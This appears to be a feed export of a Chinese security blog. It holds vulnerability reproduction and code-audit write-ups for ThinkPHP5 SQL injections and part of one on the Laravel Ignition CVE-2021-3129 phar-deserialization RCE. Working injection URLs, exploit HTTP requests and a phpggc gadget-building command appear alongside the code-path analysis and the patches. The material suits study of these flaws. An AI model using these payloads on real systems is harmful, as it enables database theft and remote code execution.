class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database tp5;<br>use tp5;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> auto_increment,<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;reader-l&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;reader-l1&#x27;</span>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;reader-l2&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h1><p>访问如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.reader-l.com:<span class="hljs-number">7777</span>/tpdemo<span class="hljs-number">1</span>/public/index.php/index/index/index?options=id`)%<span class="hljs-number">2</span>bupdatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,user(),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)%<span class="hljs-number">20</span>from%<span class="hljs-number">20</span>users%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>成功触发</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/1.png"></p><h1 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h1><p>老方法，继续跟着payload分析漏洞产生的原因：</p><p>该版本依旧是使用<code>/thinkphp/library/think/Request.php#input</code>方法获取请求数据，发现使用<code>this-&gt;filterValue</code>方法处理数据，但是基本没有处理就返回了。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/2.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/3.png"></p><p>假如开发者使用该框架进行二次开发的时候，没有进行检查和过滤的话，数据就有可能原样进入到<code>max</code>方法</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/4.png"></p><p>跟进<code>thinkphp/library/think/db/Query.php#max</code>方法：发现调用了<code>thinkphp/library/think/db/Query.php#aggregate</code>方法。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/5.png"></p><p>跟进<code>thinkphp/library/think/db/Query.php#aggregate</code>方法查看：调用<code>thinkphp/library/think/db/Connection.php#aggregate</code>方法</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/6.png"></p><p>跟进<code>thinkphp/library/think/db/Connection.php#aggregate</code>方法进行查看：</p><p>可以明显发现程序将用户可控变量 <code>$field</code> ，经过 <code>parseKey</code> 方法处理后，与 <code>SQL</code> 语句进行了拼接。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/7.png"></p><p>下面我们就来具体看看 <code>parseKey</code>方法，可以发现只是对我们的payload两端加上反引号就返回了。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/8.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/9.png"></p><p>回到<code>thinkphp/library/think/db/Connection.php#aggregate</code>方法可以发现调用了<code>/thinkphp/library/think/db/Connection.php#value</code>方法</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/10.png"></p><p>跟进<code>/thinkphp/library/think/db/Connection.php#value</code>方法查看，可以发现数据原样进入到了<code>thinkphp/library/think/db/Builder.php#select</code>方法</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/11.png"></p><p>跟进<code>thinkphp/library/think/db/Builder.php#select</code>方法进行查看</p><p>使用该方法来构造 <code>SQL</code> 语句，应该说是在分析 <code>ThinkPHP</code> 漏洞时，非常常见的了。其就是使用 <code>str_replace</code> 方法，将变量替换到 <code>SQL</code> 语句模板中。这里，我们重点关注 <code>parseField</code> 方法，因为用户可控数据存储在 <code>$options[&#39;field&#39;]</code>变量中并被传入该方法。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/13.png"></p><p>跟进<code>parseFiled</code>方法：可以发现可控数据只是经过<code>parseKey</code>方法处理，并不影响数据，然后直接用逗号拼接，最终直接替换进 <strong>SQL</strong> 语句模板里，导致 <strong>SQL注入漏洞</strong> 的发生。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/14.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/15.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/16.png"></p><h1 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h1><p>看一下官方修复的方法：</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/18.png"></p><p>在<code>thinkphp/library/think/db/builder/Mysql.php#parseKey</code>方法中添加如下判断语句。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/19.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E5%85%AD/17.png"></p><p>当匹配到除了 <strong>字母、点号、星号</strong> 以外的字符时，就抛出异常。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1.漏洞简介&quot;&gt;&lt;/a&gt;1.漏洞简介&lt;/h1&gt;&lt;p&gt;本次漏洞存在于所有 &lt;strong&gt;Mysql&lt;/strong&gt; 聚合函数相关方法。由于程序没有对数据进行很</summary>
      
    
    
    
    <category term="代码审计" scheme="https://reader-l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞分析之SQL注入五</title>
    <link href="https://reader-l.github.io/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/"/>
    <id>https://reader-l.github.io/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/</id>
    <published>2021-06-13T03:34:53.000Z</published>
    <updated>2021-06-13T14:26:25.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1.漏洞简介"></a>1.漏洞简介</h1><p>​    本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseOrder</strong> 方法中。由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句，最终导致 <strong>SQL注入漏洞</strong> 的产生。漏洞影响版本： <strong>5.1.16&lt;=ThinkPHP5&lt;=5.1.22</strong> 。</p><h1 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h1><p>通过以下命令获取测试环境代码：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">22</span> <span class="hljs-string">tpdemo</span><br></code></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-string">&quot;require&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.6.0&quot;</span>,<br>    <span class="hljs-string">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.1.22&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后执行 <code>composer update</code> ，并将 <strong>application/index/controller/Index.php</strong> 文件代码设置如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$orderby</span> = request()-&gt;get(<span class="hljs-string">&#x27;orderby&#x27;</span>);<br>        <span class="hljs-variable">$result</span> = db(<span class="hljs-string">&#x27;users&#x27;</span>)-&gt;where([<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-string">&#x27;reader-l&#x27;</span>])-&gt;order(<span class="hljs-variable">$orderby</span>)-&gt;find();<br>        var_dump(<span class="hljs-variable">$result</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <strong>config/database.php</strong> 文件中配置数据库相关信息，并开启 <strong>config/app.php</strong> 中的 <strong>app_debug</strong> 和 <strong>app_trace</strong> 。创建数据库信息如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database tp5;<br>use tp5;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> users(<br>id <span class="hljs-type">int</span> <span class="hljs-keyword">primary</span> <span class="hljs-keyword">key</span> auto_increment,<br>username <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span><br>);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username) <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;reader-l&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h1><p>访问</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://www.reader-l.com:7777/tpdemo/public/index.php/index/index/index?orderby</span>[<span class="hljs-string">id`|updatexml(1,concat(0x7,user(),0x7e),1)%23</span>]=1<br></code></pre></td></tr></table></figure><p>即可触发该SQL注入漏洞（没开启 <strong>app_debug</strong> 是无法看到 <strong>SQL</strong> 报错信息的）</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/1.png"></p><h1 id="4-漏洞分析"><a href="#4-漏洞分析" class="headerlink" title="4.漏洞分析"></a>4.漏洞分析</h1><p>直接通过跟payload来看看这个漏洞产生的原因吧。</p><p>GET传参的数据会先进到这个方法<code>thinkphp/library/think/Request.php#input</code>进行获取和处理：</p><p>可以发现只对传入的数组的值进行检查，并没有对数组的键有任何的过滤。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/2.png"></p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/3.png"></p><p>因此可以发现，倘若使用tp5产品的企业里的开发人员没有自己进行数据的检验的话，数据就会原样输入。传入的恶意参数有大概率会直接送入数据库中。</p><p>接下来跟进到<code>thinkphp/library/think/db/Query.php#order</code>方法，可以发现<code>fileld</code>数组直接赋值到<code>$this-&gt;options[&#39;order&#39;]</code>。并没有任何检查过滤。最后就将其返回了。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/4.png"></p><p>紧接着又调用了<code>thinkphp/library/think/db/Query.php#find</code>方法，跟进查看</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/6.png"></p><p>发现又调用了<code>thinkphp/library/think/db/Connection.php#find</code>方法</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/5.png"></p><p>跟进该方法<code>thinkphp/library/think/db/Connection.php#find</code>：发现调用了 <strong>Builder</strong> 类（<code>thinkphp/library/think/db/Builder.php</code>）的 <strong>select</strong> 方法，这个类在tp分析系列都有提到过。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/8.png"></p><p>跟进该方法：这个方法通过 <strong>str_replace</strong> 函数将数据填充到 <strong>SQL</strong> 模板语句中。这次我们要关注的是 <strong>parseOrder</strong> 方法。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/10.png"></p><p>​    在 <strong>parseOrder</strong> 方法中，我们看到程序通过 <strong>parseKey</strong> 方法给变量两端都加上了反引号，然后直接拼接字符串返回，没有进行任何过滤、检测，这也是导致本次 <strong>SQL注入漏洞</strong> 的原因。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/11.png"></p><h1 id="5-漏洞修复"><a href="#5-漏洞修复" class="headerlink" title="5.漏洞修复"></a>5.漏洞修复</h1><p>来看一下官方的修复：</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/12.png"></p><p>我下载v5.1.23并且进一步跟着payload进行审计，发现如下变化：<code>tpdemo/thinkphp/library/think/db/Builder.php#parseOrder</code>多了这个if语句。进不到这个if语句里面，调用不了这个<code>parseKey</code>，因此我们的payload最后拼接不了到<code>ORDER BY </code>语句后。</p><p><img src="/2021/06/13/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E4%BA%94/13.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1.漏洞简介&quot;&gt;&lt;/a&gt;1.漏洞简介&lt;/h1&gt;&lt;p&gt;​    本次漏洞存在于 &lt;strong&gt;Builder&lt;/strong&gt; 类的 &lt;strong&gt;parse</summary>
      
    
    
    
    <category term="代码审计" scheme="https://reader-l.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2021-3129-Laravel-DebugModeRce漏洞复现分析</title>
    <link href="https://reader-l.github.io/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-05-19T12:47:09.000Z</published>
    <updated>2021-06-12T14:44:12.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在CISCN2021的线上初赛有一道题就是利用<code>file_get_contents</code>反序列化phar的题目，当时是完全没有头绪。最近逛<code>freebuf</code>的时候看到<code>CVE-2021-3129</code>漏洞复现分析文章，觉得相似。因此打算复现学习一波。</p><h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2.正文"></a>2.正文</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>​    Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。</p><p>​    2021年01月12日，<code>Laravel</code>被披露存在一个远程代码执行漏洞（<code>CVE-2021-3129</code>）。当<code>Laravel</code>开启了Debug模式时，由于<code>Laravel</code>自带的<code>Ignition </code>组件对<code>file_get_contents()</code>和<code>file_put_contents()</code>函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发<code>Phar</code>反序列化，最终造成远程代码执行。</p><h2 id="2-搭建环境"><a href="#2-搭建环境" class="headerlink" title="2.搭建环境"></a>2.搭建环境</h2><p>我一般是比较喜欢自己手动搭建的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/laravel/laravel.git    <span class="hljs-comment"># 下载laravel源码</span></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> laravel</span><br><span class="hljs-meta">$</span><span class="bash"> git checkout e849812    <span class="hljs-comment"># 切换到存在漏洞的分支</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer install        <span class="hljs-comment"># 安装依赖</span></span><br><span class="hljs-meta">$</span><span class="bash"> composer require facade/ignition==2.5.1    <span class="hljs-comment"># 下载安装存在漏洞版本的组件</span></span><br><span class="hljs-meta">$</span><span class="bash"> php artisan serve --host=0.0.0.0   <span class="hljs-comment"># 启动服务器</span></span><br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/2.png"></p><p>现在访问你搭建的环境后，会爆出如下异常：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/1.png"></p><p>要想解决这个异常，我们得根据<code>Ignition</code>（<code>Laravel 6+</code>默认错误页面生成器）提供了一个<code>solutions</code>，让我们在配置文件中给<code>Laravel</code>配置一个加密<code>APP_KEY</code>。</p><p>进入到laravel项目的根目录，将根目录里的”<code>.env.example</code>“重命名”<code>.env</code>“：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/3.png"></p><p>然后我们在刷新一下页面就可以了</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/4.png"></p><h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><p>漏洞就发生在上面提到的给我们提供<code>solutions</code>的<code>Ignition</code>组件（&lt;=2.5.1）中。</p><p><code>Ignition</code>下默认提供如下<code>Solutions</code>（<code>laravel/vendor/facade/ignition/src/Solutions/</code>）：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/5.png"></p><p>通过这些solutions，只要开发者通过点击按钮的方式，就可以快速修复一些错误。</p><p>而这次漏洞出现在其中一个<code>solutions</code>：<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code></p><p>首先去瞅瞅如何调用<code>solution</code>，执行<code>solution</code>的控制器是<code>ExecuteSolutionController.php</code>(<code>vendor\facade\ignition\src\Http\Controllers\ExecuteSolutionController.php</code>)</p><p>可以发现先通过该方法<code>$request-&gt;getRunnableSolution();</code>获得<code>solution</code>，然后在调用获得的<code>solution</code>的<code>run</code>方法来处理可控的<code>parameters</code>参数传过去。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/6.png"></p><p>这次的漏洞点是出现在<code>MakeViewVariableOptionalSolution</code>在这个<code>solution</code>，我就跟进这个<code>MakeViewVariableOptionalSolution#run</code>方法看看。</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/7.png"></p><p>上图代码简化后如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">$contents = file<span class="hljs-constructor">_get_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;])</span>;<br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">parameters</span>[&#x27;<span class="hljs-params">viewFile</span>&#x27;], $<span class="hljs-params">contents</span>)</span>;<br></code></pre></td></tr></table></figure><p>可以看到这里主要功能点是：读取一个给定的路径<code>$parameters[&#39;viewFile&#39;]</code>，并替换读取到的内容中的<code>$variableName</code>为<code>$variableName ?? &#39;&#39;</code>，之后写回文件中<code>$parameters[&#39;viewFile&#39;]</code>，这就是个矛盾点，相当于啥事情都没有干。。。</p><p>这里调用了<code>file_get_contents()</code>，同时参数可控的，所以或许可以通过<code>phar://</code>协议去触发反序列化（如果有开发人员利用该框架进行开发并且写出一个文件上传的功能，那我们可以通过上传一个恶意的Phar文件）。</p><h2 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4.漏洞复现"></a>4.漏洞复现</h2><h3 id="1-漏洞检测"><a href="#1-漏洞检测" class="headerlink" title="1.漏洞检测"></a>1.漏洞检测</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.12:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>168<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;xxxxxxx&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要我们发送以上数据包，并出现如下回显及证明存在该漏洞：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/8.png"></p><h3 id="2-复现方法：Phar反序列化（上传phar恶意文件）"><a href="#2-复现方法：Phar反序列化（上传phar恶意文件）" class="headerlink" title="2.复现方法：Phar反序列化（上传phar恶意文件）"></a>2.复现方法：Phar反序列化（上传phar恶意文件）</h3><p>使用<code>phpggc</code>工具生成一条<code>laravel</code>中存在的拓展的链子：</p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> .<span class="hljs-regexp">/phpggc Laravel/</span>RCE5 <span class="hljs-string">&quot;phpinfo();&quot;</span> --phar phar -o <span class="hljs-regexp">/home/</span>reader-l<span class="hljs-regexp">/Desktop/</span>phar.gif<br></code></pre></td></tr></table></figure><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/9.png"></p><p>将这个<code>phar.gif</code>传到目标服务器下。我们在复现中直接通过手动将其放置<code>laravel</code>目录下。</p><p>然后构造如下请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.199.246:8000<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>223<br><br>&#123;<br>  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,<br>  &quot;parameters&quot;: &#123;<br>    &quot;variableName&quot;: &quot;username&quot;,<br>    &quot;viewFile&quot;: &quot;phar:///home/www/wwwroot/127.0.0.1/laravel/phar.gif/test.txt&quot;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>复现成功：</p><p><img src="/2021/05/19/CVE-2021-3129-Laravel-DebugModeRce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/10.png"></p><p>以上的漏洞利用方法得基于你能将我们构造的恶意<code>phar.gif</code>上传上去。利用比较有限。</p><p>接下来的方法利用范围更大一些。</p><h3 id="3-复现方法：利用laravel-log实现phar反序列化"><a href="#3-复现方法：利用laravel-log实现phar反序列化" class="headerlink" title="3.复现方法：利用laravel.log实现phar反序列化"></a>3.复现方法：利用<code>laravel.log</code>实现phar反序列化</h3><h4 id="1-分析"><a href="#1-分析" class="headerlink" 